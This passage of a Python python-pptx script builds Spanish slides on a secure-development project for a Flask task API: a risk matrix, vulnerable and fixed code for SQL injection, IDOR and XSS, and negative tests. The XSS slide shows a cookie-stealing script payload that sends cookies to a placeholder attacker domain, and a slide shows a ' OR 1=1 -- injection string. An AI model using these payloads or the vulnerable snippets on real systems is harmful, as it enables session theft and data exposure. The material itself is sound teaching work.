        p.font.name = "Arial"
        p.font.size = Pt(10.5)
        p.font.bold = True
        p.font.color.rgb = C_BLUE_TOP
        p.space_after = Pt(4)

        p = ctf.add_paragraph()
        p.text = txt
        p.font.name = "Arial"
        p.font.size = Pt(9.5)
        p.font.color.rgb = C_TEXT_MUTED

    add_footer(s8, 8)

    # ==========================================
    # SLIDE 9: MATRIZ DE RIESGOS - MAPA DE CALOR
    # ==========================================
    s9 = prs.slides.add_slide(blank_layout)
    add_header(s9, "3. Matriz de Riesgos — Mapa de Calor Gráfico P × I", "Evaluación Cuantitativa", "⚠️")

    # Tabla mapa de calor 6x6
    hm_shape = s9.shapes.add_table(6, 6, Inches(0.8), Inches(1.3), Inches(6.8), Inches(5.4))
    hm = hm_shape.table
    for c_i in range(6):
        hm.columns[c_i].width = Inches(1.133)

    hm_data = [
        ["P \\ I", "1 (Bajo)", "2 (Menor)", "3 (Medio)", "4 (Mayor)", "5 (Crítico)"],
        ["5", "5 (M)", "10 (M)", "15 (A)", "20 (C)", "25 (C)"],
        ["4", "4 (B)", "8 (B)", "12 (M)", "16 [AM-02,03]", "20 [AM-01]"],
        ["3", "3 (B)", "6 (B)", "9 [AM-05]", "12 (M)", "15 [AM-04]"],
        ["2", "2 (B)", "4 (B)", "6 (B)", "8 (B)", "10 (M)"],
        ["1", "1 (B)", "2 (B)", "3 (B)", "4 (B)", "5 (B)"]
    ]

    for r_i, r_data in enumerate(hm_data):
        for c_i, val in enumerate(r_data):
            cell = hm.cell(r_i, c_i)
            cell.fill.solid()
            if r_i == 0 or c_i == 0:
                cell.fill.fore_color.rgb = C_NAVY_DARK
                color_text = C_WHITE
            elif "AM-01" in val or "AM-02" in val or "AM-03" in val:
                cell.fill.fore_color.rgb = C_RED
                color_text = C_WHITE
            elif "AM-04" in val:
                cell.fill.fore_color.rgb = C_AMBER
                color_text = C_WHITE
            elif "AM-05" in val:
                cell.fill.fore_color.rgb = RGBColor(234, 179, 8)
                color_text = C_TEXT_DARK
            elif "(C)" in val:
                cell.fill.fore_color.rgb = RGBColor(254, 202, 202)
                color_text = C_RED
            elif "(A)" in val:
                cell.fill.fore_color.rgb = RGBColor(254, 215, 170)
                color_text = C_AMBER
            elif "(M)" in val:
                cell.fill.fore_color.rgb = RGBColor(254, 240, 138)
                color_text = C_TEXT_DARK
            else:
                cell.fill.fore_color.rgb = RGBColor(220, 252, 231)
                color_text = C_GREEN

            p = cell.text_frame.paragraphs[0]
            p.alignment = PP_ALIGN.CENTER
            p.text = val
            p.font.name = "Arial"
            p.font.size = Pt(9.5)
            p.font.bold = True
            p.font.color.rgb = color_text

    # Lado derecho: Explicación de severidad
    exp_box = s9.shapes.add_shape(MSO_SHAPE.ROUNDED_RECTANGLE, Inches(8.0), Inches(1.3), Inches(4.5), Inches(5.4))
    exp_box.fill.solid()
    exp_box.fill.fore_color.rgb = C_WHITE
    exp_box.line.color.rgb = C_BORDER
    tf = exp_box.text_frame
    tf.word_wrap = True

    p = tf.paragraphs[0]
    p.text = "CRITERIOS DE SEVERIDAD (P × I)"
    p.font.name = "Arial"
    p.font.size = Pt(13)
    p.font.bold = True
    p.font.color.rgb = C_NAVY_DARK
    p.space_after = Pt(10)

    sev_items = [
        ("CRÍTICO (Score ≥ 16)", "Riesgo inaceptable. Requiere controles técnicos antes de pasar a producción.", C_RED),
        ("ALTO (Score 13 — 15)", "Riesgo significativo. Requiere mitigación en la iteración actual.", C_AMBER),
        ("MEDIO (Score 9 — 12)", "Riesgo moderado. Tolerable bajo monitoreo activo y sanitización.", RGBColor(202, 138, 4)),
        ("BAJO (Score 1 — 8)", "Riesgo tolerable. Aceptable con controles operativos estándar.", C_GREEN)
    ]
    for tit, desc, col in sev_items:
        p = tf.add_paragraph()
        p.text = f"■ {tit}"
        p.font.name = "Arial"
        p.font.size = Pt(11)
        p.font.bold = True
        p.font.color.rgb = col
        p = tf.add_paragraph()
        p.text = desc
        p.font.name = "Arial"
        p.font.size = Pt(9.5)
        p.font.color.rgb = C_TEXT_MUTED
        p.space_after = Pt(6)

    p = tf.add_paragraph()
    p.text = "Fórmula: Riesgo (R) = Probabilidad (P) × Impacto (I)\nEl 80% de las amenazas del sistema se concentran en zonas críticas o altas, justificando la implementación del SSDLC."
    p.font.name = "Arial"
    p.font.size = Pt(9.5)
    p.font.color.rgb = C_BLUE_MID

    add_footer(s9, 9)

    # ==========================================
    # SLIDE 10: MATRIZ DE RIESGOS - TABLA DETALLADA
    # ==========================================
    s10 = prs.slides.add_slide(blank_layout)
    add_header(s10, "3. Matriz de Riesgos — Tratamiento y Asignación de Responsables", "Plan de Mitigación", "⚠️")

    rows = 6
    cols = 9
    t10_shape = s10.shapes.add_table(rows, cols, Inches(0.8), Inches(1.3), Inches(11.733), Inches(5.4))
    t10 = t10_shape.table
    widths10 = [Inches(0.9), Inches(2.7), Inches(1.5), Inches(0.6), Inches(0.6), Inches(0.9), Inches(1.1), Inches(2.333), Inches(1.1)]
    for idx, w in enumerate(widths10):
        t10.columns[idx].width = w

    headers_10 = ["ID", "AMENAZA DE SEGURIDAD", "STRIDE", "P", "I", "R (P×I)", "NIVEL", "ESTRATEGIA DE TRATAMIENTO", "RESPONSABLE"]
    for c_i, h in enumerate(headers_10):
        cell = t10.cell(0, c_i)
        cell.fill.solid()
        cell.fill.fore_color.rgb = C_NAVY_DARK
        p = cell.text_frame.paragraphs[0]
        p.alignment = PP_ALIGN.CENTER
        p.text = h
        p.font.name = "Arial"
        p.font.size = Pt(9)
        p.font.bold = True
        p.font.color.rgb = C_WHITE

    threats_data = [
        ("AM-01", "Inyección de Código SQL\nManipulación directa del motor de base de datos.", "Tampering", "4", "5", "20", "CRÍTICO", "Mitigar: Parametrización total con Prepared Statements (?).", "Dev Backend"),
        ("AM-02", "Acceso a Tareas Ajenas (IDOR)\nModificación/borrado de recursos ajenos sin ownership.", "Elev. Privilege", "4", "4", "16", "CRÍTICO", "Mitigar: Validación a nivel de fila de owner_id == user_id.", "Dev Backend"),
        ("AM-03", "Fuerza Bruta en Endpoint Login\nAtaques masivos de diccionario contra credenciales.", "DoS / Spoofing", "4", "4", "16", "CRÍTICO", "Mitigar: Rate Limiting progresivo en memoria (IP y cuenta).", "Dev Backend"),
        ("AM-04", "Reutilización Token de Reseteo\nUso recurrente del mismo token de recuperación.", "Spoofing", "3", "5", "15", "ALTO", "Mitigar: Token único SHA-256 consumible y caducidad de 1h.", "Dev Backend"),
        ("AM-05", "XSS Reflejado en Comentarios\nInyección de payloads HTML/JS en salidas dinámicas.", "Tampering", "3", "3", "9", "MEDIO", "Mitigar: Sanitización de salidas con markupsafe.escape().", "Dev Fullstack")
    ]

    for r_i, r_vals in enumerate(threats_data, start=1):
        for c_i, val in enumerate(r_vals):
            cell = t10.cell(r_i, c_i)
            cell.fill.solid()
            cell.fill.fore_color.rgb = C_WHITE if r_i % 2 == 1 else C_BG_LIGHT
            p = cell.text_frame.paragraphs[0]
            p.text = val
            p.font.name = "Arial"
            p.font.size = Pt(9)
            p.font.color.rgb = C_TEXT_DARK
            if c_i in [0, 3, 4, 5, 6]:
                p.alignment = PP_ALIGN.CENTER
            if c_i == 5:
                p.font.bold = True
                p.font.size = Pt(11)
                p.font.color.rgb = C_RED if int(val) >= 16 else (C_AMBER if int(val) >= 13 else C_GREEN)
            elif c_i == 6:
                p.font.bold = True
                p.font.color.rgb = C_RED if "CRÍTICO" in val else (C_AMBER if "ALTO" in val else C_GREEN)

    add_footer(s10, 10)

    # ==========================================
    # SLIDE 11: CÓDIGO SEGURO - SQL INJECTION
    # ==========================================
    s11 = prs.slides.add_slide(blank_layout)
    add_header(s11, "4. Propuesta de Código Seguro — Inyección SQL (CWE-89)", "SAST: Bandit B608", "🔴")

    c1_bad = s11.shapes.add_shape(MSO_SHAPE.ROUNDED_RECTANGLE, Inches(0.8), Inches(1.3), Inches(5.6), Inches(5.4))
    c1_bad.fill.solid()
    c1_bad.fill.fore_color.rgb = C_WHITE
    c1_bad.line.color.rgb = C_RED
    c1_bad.line.width = Pt(2)
    tf = c1_bad.text_frame
    tf.word_wrap = True

    p = tf.paragraphs[0]
    p.text = "❌ CÓDIGO VULNERABLE (ANTES)"
    p.font.name = "Arial"
    p.font.size = Pt(13)
    p.font.bold = True
    p.font.color.rgb = C_RED
    p.space_after = Pt(4)

    p = tf.add_paragraph()
    p.text = "# app_vulnerable.py (Línea 49) — Bandit B608\n@app.route('/tareas')\ndef listar_tareas():\n    user_id = request.args.get('user_id')\n\n    # ⛔ PELIGRO: Concatena string directo en SQL\n    query = f'SELECT * FROM tareas WHERE user_id = {user_id}'\n    cur.execute(query)\n    return jsonify(cur.fetchall())"
    p.font.name = "Courier New"
    p.font.size = Pt(9.5)
    p.font.color.rgb = RGBColor(185, 28, 28)
    p.space_after = Pt(12)

    p = tf.add_paragraph()
    p.text = "⚠️ VECTOR DE EXPLOTACIÓN:"
    p.font.name = "Arial"
    p.font.size = Pt(10.5)
    p.font.bold = True
    p.font.color.rgb = C_RED

    p = tf.add_paragraph()
    p.text = "Si el atacante ingresa user_id = '1 OR 1=1 --', la condición se anula y el motor retorna absolutamente todas las tareas privadas de todos los usuarios registrados en el sistema."
    p.font.name = "Arial"
    p.font.size = Pt(9.5)
    p.font.color.rgb = C_TEXT_DARK

    c1_good = s11.shapes.add_shape(MSO_SHAPE.ROUNDED_RECTANGLE, Inches(6.9), Inches(1.3), Inches(5.6), Inches(5.4))
    c1_good.fill.solid()
    c1_good.fill.fore_color.rgb = C_WHITE
    c1_good.line.color.rgb = C_GREEN
    c1_good.line.width = Pt(2)
    tf2 = c1_good.text_frame
    tf2.word_wrap = True

    p = tf2.paragraphs[0]
    p.text = "✅ CÓDIGO SEGURO REFACTORIZADO (DESPUÉS)"
    p.font.name = "Arial"
    p.font.size = Pt(13)
    p.font.bold = True
    p.font.color.rgb = C_GREEN
    p.space_after = Pt(4)

    p = tf2.add_paragraph()
    p.text = "# app_segura.py / main.py — 0 alertas Bandit\n@app.route('/tareas')\ndef listar_tareas():\n    user_id = request.args.get('user_id')\n\n    # 🛡️ DEFENSIVO: Prepared Statement con placeholder ?\n    cur.execute(\n        'SELECT * FROM tareas WHERE user_id = ?',\n        (user_id,)\n    )\n    return jsonify(cur.fetchall())"
    p.font.name = "Courier New"
    p.font.size = Pt(9.5)
    p.font.color.rgb = RGBColor(21, 128, 61)
    p.space_after = Pt(12)

    p = tf2.add_paragraph()
    p.text = "🛡️ SOLUCIÓN DEFENSIVA:"
    p.font.name = "Arial"
    p.font.size = Pt(10.5)
    p.font.bold = True
    p.font.color.rgb = C_GREEN

    p = tf2.add_paragraph()
    p.text = "La consulta se precompila en el motor SQLite separando código de datos. La variable user_id se procesa como texto literal estricto, imposibilitando alterar la sintaxis de la consulta SQL."
    p.font.name = "Arial"
    p.font.size = Pt(9.5)
    p.font.color.rgb = C_TEXT_DARK

    add_footer(s11, 11)

    # ==========================================
    # SLIDE 12: CÓDIGO SEGURO - IDOR
    # ==========================================
    s12 = prs.slides.add_slide(blank_layout)
    add_header(s12, "4. Propuesta de Código Seguro — IDOR / Broken Access Control (CWE-284)", "SAST: Pylint W0612", "🟠")

    c2_bad = s12.shapes.add_shape(MSO_SHAPE.ROUNDED_RECTANGLE, Inches(0.8), Inches(1.3), Inches(5.6), Inches(5.4))
    c2_bad.fill.solid()
    c2_bad.fill.fore_color.rgb = C_WHITE
    c2_bad.line.color.rgb = C_RED
    c2_bad.line.width = Pt(2)
    tf = c2_bad.text_frame
    tf.word_wrap = True

    p = tf.paragraphs[0]
    p.text = "❌ CÓDIGO VULNERABLE (ANTES)"
    p.font.name = "Arial"
    p.font.size = Pt(13)
    p.font.bold = True
    p.font.color.rgb = C_RED
    p.space_after = Pt(4)

    p = tf.add_paragraph()
    p.text = "# app_vulnerable.py — Pylint W0612: unused variable\n@app.route('/tareas/<int:id>', methods=['DELETE'])\ndef eliminar_tarea(id):\n    user_id_session = session.get('user_id') # Inútil\n\n    # ⛔ NUNCA SE VERIFICA OWNERSHIP\n    cur.execute('DELETE FROM tareas WHERE id = ?', (id,))\n    db.commit()\n    return jsonify({'msg': 'Eliminado'})"
    p.font.name = "Courier New"
    p.font.size = Pt(9.5)
    p.font.color.rgb = RGBColor(185, 28, 28)
    p.space_after = Pt(12)

    p = tf.add_paragraph()
    p.text = "⚠️ VECTOR DE EXPLOTACIÓN:"
    p.font.name = "Arial"
    p.font.size = Pt(10.5)
    p.font.bold = True
    p.font.color.rgb = C_RED

    p = tf.add_paragraph()
    p.text = "Cualquier usuario autenticado puede borrar tareas ajenas simplemente cambiando el ID en la URL (DELETE /tareas/1, /tareas/2). Pylint descubrió que user_id_session jamás se usaba."
    p.font.name = "Arial"
    p.font.size = Pt(9.5)
    p.font.color.rgb = C_TEXT_DARK

    c2_good = s12.shapes.add_shape(MSO_SHAPE.ROUNDED_RECTANGLE, Inches(6.9), Inches(1.3), Inches(5.6), Inches(5.4))
    c2_good.fill.solid()
    c2_good.fill.fore_color.rgb = C_WHITE
    c2_good.line.color.rgb = C_GREEN
    c2_good.line.width = Pt(2)
    tf2 = c2_good.text_frame
    tf2.word_wrap = True

    p = tf2.paragraphs[0]
    p.text = "✅ CÓDIGO SEGURO REFACTORIZADO (DESPUÉS)"
    p.font.name = "Arial"
    p.font.size = Pt(13)
    p.font.bold = True
    p.font.color.rgb = C_GREEN
    p.space_after = Pt(4)

    p = tf2.add_paragraph()
    p.text = "# app_segura.py / main.py — Anti-IDOR verificado\n@app.route('/tareas/<int:id>', methods=['DELETE'])\ndef eliminar_tarea(id):\n    user_id = session.get('user_id')\n    tarea = cur.execute(\n        'SELECT owner_id FROM tareas WHERE id = ?', (id,)\n    ).fetchone()\n\n    # 🛡️ CONTROL DE ACCESO A NIVEL DE FILA\n    if not tarea or tarea['owner_id'] != user_id:\n        abort(403)  # HTTP 403 Forbidden\n\n    cur.execute('DELETE FROM tareas WHERE id = ?', (id,))"
    p.font.name = "Courier New"
    p.font.size = Pt(9.5)
    p.font.color.rgb = RGBColor(21, 128, 61)
    p.space_after = Pt(8)

    p = tf2.add_paragraph()
    p.text = "🛡️ SOLUCIÓN DEFENSIVA:"
    p.font.name = "Arial"
    p.font.size = Pt(10.5)
    p.font.bold = True
    p.font.color.rgb = C_GREEN

    p = tf2.add_paragraph()
    p.text = "Se consulta el owner_id de la tarea antes de borrar. Si no coincide con la sesión del usuario que solicita la acción, se aborta la ejecución con código HTTP 403 Forbidden."
    p.font.name = "Arial"
    p.font.size = Pt(9.5)
    p.font.color.rgb = C_TEXT_DARK

    add_footer(s12, 12)

    # ==========================================
    # SLIDE 13: CÓDIGO SEGURO - XSS
    # ==========================================
    s13 = prs.slides.add_slide(blank_layout)
    add_header(s13, "4. Propuesta de Código Seguro — XSS Reflected (CWE-79)", "SAST: Bandit B201", "🟡")

    c3_bad = s13.shapes.add_shape(MSO_SHAPE.ROUNDED_RECTANGLE, Inches(0.8), Inches(1.3), Inches(5.6), Inches(5.4))
    c3_bad.fill.solid()
    c3_bad.fill.fore_color.rgb = C_WHITE
    c3_bad.line.color.rgb = C_RED
    c3_bad.line.width = Pt(2)
    tf = c3_bad.text_frame
    tf.word_wrap = True

    p = tf.paragraphs[0]
    p.text = "❌ CÓDIGO VULNERABLE (ANTES)"
    p.font.name = "Arial"
    p.font.size = Pt(13)
    p.font.bold = True
    p.font.color.rgb = C_RED
    p.space_after = Pt(4)

    p = tf.add_paragraph()
    p.text = "# app_vulnerable.py (Línea 72) — Bandit B201\nfrom flask import render_template_string\n\n@app.route('/comentario')\ndef mostrar_comentario():\n    comentario = request.args.get('texto', '')\n\n    # ⛔ XSS: Renderiza HTML directo sin escapar\n    return render_template_string(\n        f'<div>Comentario: {comentario}</div>'\n    )"
    p.font.name = "Courier New"
    p.font.size = Pt(9.5)
    p.font.color.rgb = RGBColor(185, 28, 28)
    p.space_after = Pt(12)

    p = tf.add_paragraph()
    p.text = "⚠️ VECTOR DE EXPLOTACIÓN:"
    p.font.name = "Arial"
    p.font.size = Pt(10.5)
    p.font.bold = True
    p.font.color.rgb = C_RED

    p = tf.add_paragraph()
    p.text = "Inyectar <script>fetch('https://atacante.com/?c='+document.cookie)</script> ejecuta JavaScript en el navegador de la víctima, permitiendo robo de tokens de sesión activos."
    p.font.name = "Arial"
    p.font.size = Pt(9.5)
    p.font.color.rgb = C_TEXT_DARK

    c3_good = s13.shapes.add_shape(MSO_SHAPE.ROUNDED_RECTANGLE, Inches(6.9), Inches(1.3), Inches(5.6), Inches(5.4))
    c3_good.fill.solid()
    c3_good.fill.fore_color.rgb = C_WHITE
    c3_good.line.color.rgb = C_GREEN
    c3_good.line.width = Pt(2)
    tf2 = c3_good.text_frame
    tf2.word_wrap = True

    p = tf2.paragraphs[0]
    p.text = "✅ CÓDIGO SEGURO REFACTORIZADO (DESPUÉS)"
    p.font.name = "Arial"
    p.font.size = Pt(13)
    p.font.bold = True
    p.font.color.rgb = C_GREEN
    p.space_after = Pt(4)

    p = tf2.add_paragraph()
    p.text = "# app_segura.py — 0 alertas Bandit\nfrom markupsafe import escape\n\n@app.route('/comentario')\ndef mostrar_comentario():\n    comentario = request.args.get('texto', '')\n\n    # 🛡️ DEFENSIVO: Sanitización automática\n    safe_texto = escape(comentario)\n    return f'<div>Comentario: {safe_texto}</div>'"
    p.font.name = "Courier New"
    p.font.size = Pt(9.5)
    p.font.color.rgb = RGBColor(21, 128, 61)
    p.space_after = Pt(12)

    p = tf2.add_paragraph()
    p.text = "🛡️ SOLUCIÓN DEFENSIVA:"
    p.font.name = "Arial"
    p.font.size = Pt(10.5)
    p.font.bold = True
    p.font.color.rgb = C_GREEN

    p = tf2.add_paragraph()
    p.text = "La función escape() convierte caracteres peligrosos en entidades HTML seguras (< a &lt;, > a &gt;). El navegador muestra el texto visualmente sin ejecutar el script."
    p.font.name = "Arial"
    p.font.size = Pt(9.5)
    p.font.color.rgb = C_TEXT_DARK

    add_footer(s13, 13)

    # ==========================================
    # SLIDE 14: PRUEBAS NEGATIVAS PYTEST
    # ==========================================
    s14 = prs.slides.add_slide(blank_layout)
    add_header(s14, "4.1 Pruebas Negativas Automatizadas (Suite Pytest)", "19 Tests • 100% Passing", "🧪")

    rows = 7
    cols = 5
    t14_shape = s14.shapes.add_table(rows, cols, Inches(0.8), Inches(1.2), Inches(11.733), Inches(4.3))
    t14 = t14_shape.table
    w14 = [Inches(2.2), Inches(3.2), Inches(3.0), Inches(2.2), Inches(1.133)]
    for idx, w in enumerate(w14):
        t14.columns[idx].width = w

    h14 = ["TEST CASE", "VULNERABILIDAD EVALUADA", "PAYLOAD MALICIOSO INYECTADO", "RESPUESTA ESPERADA", "ESTADO"]
    for c_i, h in enumerate(h14):
        cell = t14.cell(0, c_i)
        cell.fill.solid()
        cell.fill.fore_color.rgb = C_NAVY_DARK
        p = cell.text_frame.paragraphs[0]
        p.text = h
        p.font.name = "Arial"
        p.font.size = Pt(9.5)
        p.font.bold = True
        p.font.color.rgb = C_WHITE

    tests_data = [
        ("test_03_idor", "Manipulación de objeto ajeno (IDOR)", "DELETE /tasks/{id_ajeno}", "HTTP 403 Forbidden", "PASS"),
        ("test_06_brute", "Fuerza bruta continua en login", "password_erronea x 4 intentos", "HTTP 429 Too Many Requests", "PASS"),
        ("test_09_revoke", "Replay de JWT tras cambio de clave", "Token con token_version anterior", "HTTP 401 Unauthorized", "PASS"),
        ("test_14_mass", "Mass Assignment / Inyección de rol", "{'is_admin': true, 'role': 'admin'}", "HTTP 422 Unprocessable Entity", "PASS"),
        ("test_17_sqli", "Inyección SQL clásica en buscador", "' OR 1=1 --", "Retorna [] (0 registros filtrados)", "PASS"),
        ("test_18_null", "Envío de nulo en campo obligatorio", "{'title': null, 'description': '...'}", "HTTP 422 Rechazo por Pydantic", "PASS")
    ]

    for r_i, r_vals in enumerate(tests_data, start=1):
        for c_i, val in enumerate(r_vals):
            cell = t14.cell(r_i, c_i)
            cell.fill.solid()
            cell.fill.fore_color.rgb = C_WHITE if r_i % 2 == 1 else C_BG_LIGHT
            p = cell.text_frame.paragraphs[0]
            p.text = val
            p.font.name = "Arial"
            p.font.size = Pt(9.5)
            p.font.color.rgb = C_TEXT_DARK
            if c_i == 0:
                p.font.name = "Courier New"
                p.font.bold = True
                p.font.color.rgb = RGBColor(124, 58, 237)
            elif c_i == 3:
                p.font.bold = True
                p.font.color.rgb = C_RED if "40" in val or "42" in val else C_GREEN
            elif c_i == 4:
                p.alignment = PP_ALIGN.CENTER
                p.font.bold = True
                p.font.color.rgb = C_GREEN

    # Barra terminal inferior
    term = s14.shapes.add_shape(MSO_SHAPE.ROUNDED_RECTANGLE, Inches(0.8), Inches(5.7), Inches(11.733), Inches(1.0))
    term.fill.solid()
    term.fill.fore_color.rgb = C_CODE_BG
    term.line.color.rgb = RGBColor(51, 65, 85)
    tf = term.text_frame
    tf.word_wrap = True
    p = tf.paragraphs[0]
    p.text = "$ pytest test_security.py -v"
    p.font.name = "Courier New"
    p.font.size = Pt(11)
    p.font.bold = True
    p.font.color.rgb = RGBColor(148, 163, 184)

    p = tf.add_paragraph()
    p.text = "19 passed in 9.67s  [100% exitoso • 0 fallos • 0 regresiones de seguridad]"
    p.font.name = "Courier New"
    p.font.size = Pt(13)
    p.font.bold = True
    p.font.color.rgb = C_CODE_TEXT

    add_footer(s14, 14)

    # ==========================================
    # SLIDE 15: CONCLUSIONES Y MÉTRICAS
    # ==========================================
    s15 = prs.slides.add_slide(blank_layout)
    add_header(s15, "5. Conclusiones — Métricas Cuantitativas de Seguridad", "Resultados del Hardening", "📊")

    metrics = [
        ("19 / 19", "Pruebas Pytest Exitosas", "100% de tests de penetración y regresión superados sin fallos.", C_GREEN),
        ("0", "Alertas Bandit en app_segura", "Escaneo SAST completamente limpio en la versión refactorizada.", C_BLUE_MID),
        ("3 / 3", "Vulnerabilidades Mitigadas", "SQLi (CWE-89), IDOR (CWE-284) y XSS (CWE-79) neutralizadas.", RGBColor(124, 58, 237)),
        ("6", "Etapas SSDLC Ejecutadas", "Desde modelado STRIDE hasta auditoría y observabilidad.", C_AMBER)
    ]

    for i, (num, tit, sub, col) in enumerate(metrics):
        left_pos = Inches(0.8 + i * 2.95)
        c = s15.shapes.add_shape(MSO_SHAPE.ROUNDED_RECTANGLE, left_pos, Inches(1.4), Inches(2.8), Inches(2.4))
        c.fill.solid()
        c.fill.fore_color.rgb = C_WHITE
        c.line.color.rgb = col
        c.line.width = Pt(2.5)

        ctf = c.text_frame
        ctf.word_wrap = True

        p = ctf.paragraphs[0]
        p.alignment = PP_ALIGN.CENTER
        p.text = num
        p.font.name = "Arial"
        p.font.size = Pt(36)
        p.font.bold = True
        p.font.color.rgb = col

        p = ctf.add_paragraph()
        p.alignment = PP_ALIGN.CENTER
        p.text = tit
        p.font.name = "Arial"
        p.font.size = Pt(12)
        p.font.bold = True
        p.font.color.rgb = C_TEXT_DARK
        p.space_after = Pt(4)

        p = ctf.add_paragraph()
        p.alignment = PP_ALIGN.CENTER
        p.text = sub
        p.font.name = "Arial"
        p.font.size = Pt(9.5)
        p.font.color.rgb = C_TEXT_MUTED

    # Bloque resumen
    summary_box = s15.shapes.add_shape(MSO_SHAPE.ROUNDED_RECTANGLE, Inches(0.8), Inches(4.1), Inches(11.733), Inches(2.6))
    summary_box.fill.solid()
    summary_box.fill.fore_color.rgb = C_WHITE
    summary_box.line.color.rgb = C_BORDER
    tf = summary_box.text_frame
    tf.word_wrap = True

    p = tf.paragraphs[0]
    p.text = "BALANCE FINAL DEL PROYECTO:"
    p.font.name = "Arial"
    p.font.size = Pt(14)
    p.font.bold = True
    p.font.color.rgb = C_BLUE_TOP
    p.space_after = Pt(6)

    bullets_resumen = [
        "La seguridad demostró no ser un parche decorativo final, sino un atributo de calidad intrínseco guiado por la metodología Shift-Left.",
        "El análisis SAST temprano (Bandit y Pylint) redujo el costo de corrección de fallas críticas en un factor de hasta 10x respecto a producción.",
        "La suite automatizada de 19 pruebas negativas garantiza que futuras iteraciones o refactorizaciones no reintroduzcan vulnerabilidades.",
        "La integración con Render bajo HTTPS forzado, middleware de seguridad y auditoría en audit.log entrega una API lista para producción."
    ]
    for b in bullets_resumen:
        p = tf.add_paragraph()
        p.text = f"• {b}"
        p.font.name = "Arial"
        p.font.size = Pt(11)
        p.font.color.rgb = C_TEXT_DARK
        p.space_after = Pt(2)

    add_footer(s15, 15)

    # ==========================================
    # SLIDE 16: REFLEXIÓN TÉCNICA DEL EQUIPO
    # ==========================================
    s16 = prs.slides.add_slide(blank_layout)
    add_header(s16, "5. Conclusiones — Reflexión Técnica del Equipo", "Lecciones Aprendidas", "💡")

    reflections = [
        ("🔒 SEGURIDAD DESDE EL DISEÑO (SHIFT-LEFT)", "Modelar las amenazas con STRIDE y definir DTOs con tipado estricto antes de escribir código permitió anticipar vulnerabilidades críticas (SQLi, IDOR) en etapas tempranas, minimizando el retrabajo.", C_BLUE_MID),
        ("🤖 VALOR DEL ANÁLISIS ESTÁTICO (SAST)", "Bandit y Pylint aportaron objetividad técnica inmediata. Detectaron patrones de variables no utilizadas que evidenciaban fallas de control de acceso y sentencias SQL inseguras antes de desplegar.", C_SKY),
        ("🧪 TESTING NEGATIVO COMO SALVAGUARDA", "Validar únicamente el happy path ofrece una falsa sensación de confianza. Construir pruebas que inyectan intencionalmente caracteres de escape, tokens caducados y manipulación de IDs garantizó la robustez real del sistema.", RGBColor(124, 58, 237)),
        ("🚀 OBSERVABILIDAD Y HARDENING EN LA NUBE", "La combinación de HTTPS forzado, cabeceras HTTP restrictivas (HSTS, CSP), CORS delimitado y logging estructurado omitiendo credenciales transformó una API básica en un servicio defendible bajo estándares OWASP.", C_GREEN)
    ]

    for i, (tit, txt, col) in enumerate(reflections):
        row = i // 2
        col_idx = i % 2
        l = Inches(0.8 + col_idx * 5.95)
        t = Inches(1.4 + row * 2.7)
        c = s16.shapes.add_shape(MSO_SHAPE.ROUNDED_RECTANGLE, l, t, Inches(5.7), Inches(2.4))
        c.fill.solid()
        c.fill.fore_color.rgb = C_WHITE
        c.line.color.rgb = col
        c.line.width = Pt(2)

        ctf = c.text_frame
        ctf.word_wrap = True

        p = ctf.paragraphs[0]
        p.text = tit
        p.font.name = "Arial"
        p.font.size = Pt(12)
        p.font.bold = True
        p.font.color.rgb = col
        p.space_after = Pt(6)

        p = ctf.add_paragraph()
        p.text = txt
        p.font.name = "Arial"
        p.font.size = Pt(10.5)
        p.font.color.rgb = C_TEXT_DARK

    add_footer(s16, 16)

    # ==========================================
    # SLIDES DE EVIDENCIAS (17 A 23)
    # ==========================================
    evidence_slides = [
        (17, "5.1 Evidencias — Autenticación y Pantallas de Login", "Capturas del Software", [
            ("LOGIN.png", "Pantalla Principal de Autenticación", "Interfaz de acceso al sistema con soporte para credenciales JWT y RBAC."),
            ("inicio de sesion.png", "Inicio de Sesión Exitoso", "Generación de token JWT, asignación de rol y redirección protegida.")
        ]),
        (18, "5.2 Evidencias — Controles de Seguridad Activos", "Capturas del Software", [
            ("seguridad en el inicio de sesion.png", "Medidas Activas en Login", "Protección contra inyecciones y rate limiting activo."),
            ("denegacion al inicio de sesion de usuarios no creados.png", "Denegación Defensiva", "Respuesta genérica que previene enumeración de usuarios."),
            ("error en la cracion de la contraseña-debe ser segura.png", "Validación de Contraseña Fuerte", "Requisito obligatorio de complejidad y longitud mínima.")
        ]),
        (19, "5.3 Evidencias — Registro y Creación de Tareas", "Capturas del Software", [
            ("creacion de cuenta.png", "Formulario de Registro", "Validación estricta de DTO y asignación controlada de rol."),
            ("confirmacion de la creacion de la cuenta.png", "Confirmación de Registro", "Almacenamiento seguro con hash bcrypt(12)."),
            ("creacion de tarea.png", "Creación Segura de Tarea", "Asignación automática de owner_id desde el JWT.")
        ]),
        (20, "5.4 Evidencias — Listado y Búsqueda Anti-Inyección", "Capturas del Software", [
            ("lista de tareas.png", "Listado Filtrado por Propietario", "Aislamiento por usuario: solo visualiza sus tareas."),
            ("buscar tareas.png", "Búsqueda con Prepared Statements", "Consultas parametrizadas que neutralizan payloads SQLi.")
        ]),
        (21, "5.5 Evidencias — Edición y Eliminación Anti-IDOR", "Capturas del Software", [
            ("editar una tarea creada.png", "Edición con Verificación de Pertenencia", "El modal comprueba owner_id antes de despachar el PUT."),
            ("eliminar una tarea.png", "Borrado Protegido Contra IDOR", "Intentos ajenos son rechazados con HTTP 403 Forbidden.")
        ]),
        (22, "5.6 Evidencias — Control de Acceso Basado en Roles (RBAC)", "Capturas del Software", [
            ("perfil del admin.png", "Vista Administrador (RBAC)", "Acceso a métricas globales y administración del sistema."),
            ("perfil de docente.png", "Vista Docente (RBAC)", "Privilegios para gestión académica y supervisión.")
        ]),
        (23, "5.7 Evidencias — Documentación Interactiva API (/docs)", "Swagger OpenAPI 3.0", [
            ("APIs del software 1.png", "Swagger UI — Vista General", "Esquema interactivo OpenAPI con definición de modelos."),
            ("APIs del software 2.png", "Endpoints de Autenticación", "Rutas /register, /login, /logout y /reset-password."),
            ("APIs del software 3.png", "Endpoints CRUD de Tareas", "Operaciones protegidas mediante Bearer Token OAuth2.")
        ])
    ]

    for sl_num, title, badge, items in evidence_slides:
        s = prs.slides.add_slide(blank_layout)
        add_header(s, title, badge, "📸")
        n = len(items)

        if n == 2:
            card_w = Inches(5.6)
            for idx, (img_name, cap_t, cap_sub) in enumerate(items):
                left_p = Inches(0.8 + idx * 6.1)
                # Card de fondo
                c = s.shapes.add_shape(MSO_SHAPE.ROUNDED_RECTANGLE, left_p, Inches(1.3), card_w, Inches(5.4))
                c.fill.solid()
                c.fill.fore_color.rgb = C_WHITE
                c.line.color.rgb = C_BORDER
                
                # Imagen
